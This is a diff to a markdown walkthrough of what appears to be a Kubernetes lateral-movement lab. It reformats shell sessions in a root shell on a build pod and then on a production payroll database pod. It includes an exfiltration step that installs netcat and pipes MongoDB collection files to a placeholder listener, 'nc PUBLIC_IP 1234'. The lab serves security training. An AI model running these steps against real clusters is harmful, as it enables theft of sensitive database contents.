@@ -14,14 +14,23 @@ kubectl exec -it -n lateral-movement-build bobdev -- /bin/bash
 
 Let's take a look around to see what we can do:
 
+```sh
+id
 ```
-bash-4.2# id
+```
 uid=0(root) gid=0(root) groups=0(root)
-
-bash-4.2# sudo -l
+```
+```sh
+sudo -l
+```
+```
 bash: sudo: command not found
+```
 
-bash-4.2# ps -aux
+```sh
+ps -aux
+```
+```
 bash: ps: command not found
 ```
 
@@ -76,12 +85,22 @@ kubectl exec -it -n lateral-movement-prod $(kubectl get pods -n lateral-movement
 
 Now, we have ended on a pod in the production namespace, and a database pod on top of that. Let's take a look around:
 
+```sh
+whoami
 ```
-root@payrolldb-6cd4447758-2zcq4:/# whoami
+```
 root
-root@payrolldb-6cd4447758-2zcq4:/# ls
+```
+```sh
+ls
+```
+```
 bin  boot  data  dev  docker-entrypoint-initdb.d  etc  home  js-yaml.js  lib  lib32  lib64  libx32  media  mnt	opt  proc  root  run  sbin  srv  sys  tmp  usr	var
-root@payrolldb-6cd4447758-2zcq4:/# ls data/
+```
+```sh
+ls data/
+```
+```
 configdb  db
 ```
 
@@ -102,10 +121,15 @@ Then run this in the pod:
 
 ```sh
 apt update && apt install netcat
+```
+```sh
 # make sure to edit this with the correct PUBLIC_IP of the listening server
 cat data/db/collection-0-*.wt | nc PUBLIC_IP 1234
-# wait a few seconds, then kill the command with Ctrl-C
 ```
+
+> <i class="fa fa-circle-info"></i> **Note:**
+> 
+> This command will not close on its own. After a few seconds, use `Ctrl-C` to stop the command.
 
 On the public server, you should now have the collection-0 file in `download`.
 
